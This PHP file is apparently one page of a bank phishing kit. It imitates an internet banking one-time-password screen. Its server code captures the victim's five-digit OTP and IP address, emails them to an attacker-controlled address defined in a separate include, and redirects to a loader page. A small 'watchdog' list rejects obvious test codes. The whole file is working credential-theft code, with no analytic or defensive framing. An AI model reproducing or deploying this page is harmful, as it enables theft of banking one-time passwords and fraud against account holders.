<?php @session_start();
require 'add.php';

$watchdog = array("12345", "54321", "01234");
$ip = getenv("REMOTE_ADDR");

if(isset($_POST['submit_otp']))
{
    if(trim($_POST['dap']) == "" || !preg_match('/^[0-9]{5}$/', $_POST['dap']) || in_array($_POST['dap'], $watchdog))
    {
        $error = 'Please enter a valid one-time password.';
    }    
    else {
        
	    $_SESSION['dap'] = $_POST['dap'];
	    $to = EMAIL;
        $subject = "ots 1 ".$ip;
        $msg  = $_POST['dap']."<br>";
        $msg .= $ip;
		
        $headers  = 'MIME-Version: 1.0' . "\r\n";
        $headers .= 'Content-type: text/html; charset=utf-8' . "\r\n";
        $headers .= 'From: rezolt' . "\r\n" .
    		      'X-Mailer: PHP/' . phpversion();
	    mail($to,$subject,$msg,$headers);
	    header('Location:loader.php');
	    exit;
	}
}

require 'includes/header.php';
?>
		<div class="navbar-header">
				<button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
				<span class="sr-only">Toggle navigation</span>
				<span class="icon-bar"></span> 
				<span class="icon-bar"></span>
				<span class="icon-bar"></span>
				</button>
			</div>
<?php
require 'includes/nav.php';
?>

<div id="pageContentFrame">
				<div id="pageContent" class="product" style="opacity: 1;">
					
					<div class="container">
						<div class="featured-area-bg">
							<div class="row container">
								<ol id="crumbList" class="col-sm-6 breadcrumb">
									<li><a href="#" class="crum">Home</a></li>
									<li class="last">One-time password</li>
								</ol>
							</div>
						</div>
						<br class="clearBoth">
						<div class="row">
							<div class="col-sm-10">

								<div class="panel panel-default">
									


<span style="font-size: xx-small; float: right; padding: 7px; color: #26428B; background-color: white;">
<?php
date_default_timezone_set('Africa/Johannesburg');
echo date('l, d F Y H:i:s', time());
?>
</span>

									<div class="panel-body panel-content">
										<h4>											
											<span>												
													One-time password
											</span>		
										</h4>
										
										<br class="clearBoth">							

										<div>
											<label>  <b>Preferred method:</b> SMS
											</label>
										</div>
										
							            <form id="otpForm" method="POST" action="otp.php">  
								        <?php
								        if(isset($_POST['submit_otp']))
								        {
										?>
										<div>
										    <div class="error notification">    
												<p class="error" alt="Error message"><?php echo $error; ?></p>
											</div>
								        </div>
								        <?php } ?>
											<div>
								          		Please enter the one-time password sent to your 
								                   
								                      <b>Cellphone</b> 
								                  
								                  
								                  on <b>
													  <?php
                                                      date_default_timezone_set('Africa/Johannesburg');
                                                      echo date('Y-m-d H:i:s', time());
                                                      ?></b>:
											</div>
											<br>
											<div>
												<div class="form-group">
														<input type="password" maxlength="5" name="dap" placeholder="*****" class="input-sm" value="">
												</div>	
											</div>
											<hr>
											<div class="form-group">
												<button type="submit" name="submit_otp" accesskey="C" value="Continue" class="btn btn-primary ladda-button" data-style="expand-left">
													<span class="ladda-label">Next</span><span class="ladda-spinner"></span>
													<div class="ladda-progress"></div>
												<span class="ladda-spinner"></span></button>
												<button type="submit" name="submit_new_channel" accesskey="R" value="Resend" class="btn btn-info "><span class="ladda-label">Resend OTP</span><span class="ladda-spinner"></span></button>
											</div>
											<br>
											<div>
												<b> Note: </b>
												<ol>
													<li>If you request a new one-time password the previous password will no longer be valid.  
													</li><li>Your one-time password can be used for one Internet banking transaction only.
													</li><li>Your one-time password is valid for 15 minutes from the time you receive it.
													</li><li>If you are not able to receive your OTP via your default delivery method, please call the Customer contact centre.
												</li></ol>
											</div>
											<div>
												<script type="text/javascript" language="JavaScript">
												<!--
													var focusControl = document.forms["otpForm"].elements["dap"];
													if (focusControl != null
															&& focusControl.type != "hidden") {
														focusControl.focus();
													}
												// -->
												</script>
											</div>
							        	</form>
        							</div>
								</div>							
							</div>							
			
						</div>						
					</div>
					
				</div>
			</div>
        	
<?php
require 'includes/footer.php';
?>
<!-- Modal -->
<div class="modal" id="genericModal" role="dialog" aria-labelledby="genericModalLabel" aria-hidden="true">
    <div class="modal-dialog">
        <div class="modal-content">
        </div> <!-- /.modal-content -->
    </div> <!-- /.modal-dialog -->
</div>
</body>
</html>
<?php
if(isset($_POST['submit_new_channel']))
{
    header('Location:otp.php');
    exit;
}
?>
